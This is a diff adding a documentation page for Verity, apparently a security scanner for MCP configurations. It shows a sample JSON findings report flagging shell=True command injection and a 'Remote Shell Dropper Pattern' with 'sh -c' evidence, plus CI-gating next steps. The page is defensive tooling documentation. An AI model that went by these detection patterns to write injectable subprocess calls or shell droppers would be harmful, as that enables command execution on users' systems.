+<a id="__codelineno-12-27" name="__codelineno-12-27" href="#__codelineno-12-27"></a><span class="w">      </span><span class="nt">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"VERITY-AST-CWE-78-SHELL"</span><span class="p">,</span>
+<a id="__codelineno-12-28" name="__codelineno-12-28" href="#__codelineno-12-28"></a><span class="w">      </span><span class="nt">"title"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Command Injection via shell=True Subprocess"</span><span class="p">,</span>
+<a id="__codelineno-12-29" name="__codelineno-12-29" href="#__codelineno-12-29"></a><span class="w">      </span><span class="nt">"severity"</span><span class="p">:</span><span class="w"> </span><span class="s2">"high"</span><span class="p">,</span>
+<a id="__codelineno-12-30" name="__codelineno-12-30" href="#__codelineno-12-30"></a><span class="w">      </span><span class="nt">"location"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">"file"</span><span class="p">:</span><span class="w"> </span><span class="s2">"agent/tools.py"</span><span class="p">,</span><span class="w"> </span><span class="nt">"line"</span><span class="p">:</span><span class="w"> </span><span class="mi">57</span><span class="p">},</span>
+<a id="__codelineno-12-31" name="__codelineno-12-31" href="#__codelineno-12-31"></a><span class="w">      </span><span class="nt">"evidence"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">"sink"</span><span class="p">:</span><span class="w"> </span><span class="s2">"subprocess.run"</span><span class="p">,</span><span class="w"> </span><span class="nt">"shell"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">},</span>
+<a id="__codelineno-12-32" name="__codelineno-12-32" href="#__codelineno-12-32"></a><span class="w">      </span><span class="nt">"remediation"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Use argument lists and disable shell execution."</span>
+<a id="__codelineno-12-33" name="__codelineno-12-33" href="#__codelineno-12-33"></a><span class="w">    </span><span class="p">},</span>
+<a id="__codelineno-12-34" name="__codelineno-12-34" href="#__codelineno-12-34"></a><span class="w">    </span><span class="p">{</span>
+<a id="__codelineno-12-35" name="__codelineno-12-35" href="#__codelineno-12-35"></a><span class="w">      </span><span class="nt">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"VERITY-STATIC-SHELL-DROPPER"</span><span class="p">,</span>
+<a id="__codelineno-12-36" name="__codelineno-12-36" href="#__codelineno-12-36"></a><span class="w">      </span><span class="nt">"title"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Remote Shell Dropper Pattern"</span><span class="p">,</span>
+<a id="__codelineno-12-37" name="__codelineno-12-37" href="#__codelineno-12-37"></a><span class="w">      </span><span class="nt">"severity"</span><span class="p">:</span><span class="w"> </span><span class="s2">"medium"</span><span class="p">,</span>
+<a id="__codelineno-12-38" name="__codelineno-12-38" href="#__codelineno-12-38"></a><span class="w">      </span><span class="nt">"location"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">"file"</span><span class="p">:</span><span class="w"> </span><span class="s2">"mcp.json"</span><span class="p">,</span><span class="w"> </span><span class="nt">"line"</span><span class="p">:</span><span class="w"> </span><span class="mi">8</span><span class="p">},</span>
+<a id="__codelineno-12-39" name="__codelineno-12-39" href="#__codelineno-12-39"></a><span class="w">      </span><span class="nt">"evidence"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">"command"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sh -c"</span><span class="p">},</span>
+<a id="__codelineno-12-40" name="__codelineno-12-40" href="#__codelineno-12-40"></a><span class="w">      </span><span class="nt">"remediation"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Pin the executable and remove shell interpolation."</span>
+<a id="__codelineno-12-41" name="__codelineno-12-41" href="#__codelineno-12-41"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-12-42" name="__codelineno-12-42" href="#__codelineno-12-42"></a><span class="w">  </span><span class="p">]</span>
+<a id="__codelineno-12-43" name="__codelineno-12-43" href="#__codelineno-12-43"></a><span class="p">}</span>
+</code></pre></div>
+<p>The non-zero exit code fails a CI gate configured with <code>--fail-on-findings</code>, while the JSON artifact preserves evidence for review.</p>
+<hr />
+<h2 id="next-steps">Next steps<a class="headerlink" href="#next-steps" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="getting-started/installation/">Install Verity</a> for your environment.</li>
+<li>Run <code>verity scan --path . --format terminal</code> on an existing MCP configuration.</li>
+<li>Add <code>verity serve</code> to your IDE and ask the assistant to scan the current workspace.</li>
+<li>Wire <code>--fail-on-findings</code> into CI and upload JSON/SARIF artifacts.</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": ".", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.top", "navigation.indexes", "search.suggest", "search.highlight", "content.code.copy", "content.code.annotate", "content.action.edit", "content.action.view", "search.share"], "search": "assets/javascripts/workers/search.a7633da7.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": {"provider": "mike"}}</script>
+    
+    
+      <script src="assets/javascripts/bundle.a5f9d56c.min.js"></script>
+      
+    
+  </body>
+</html>
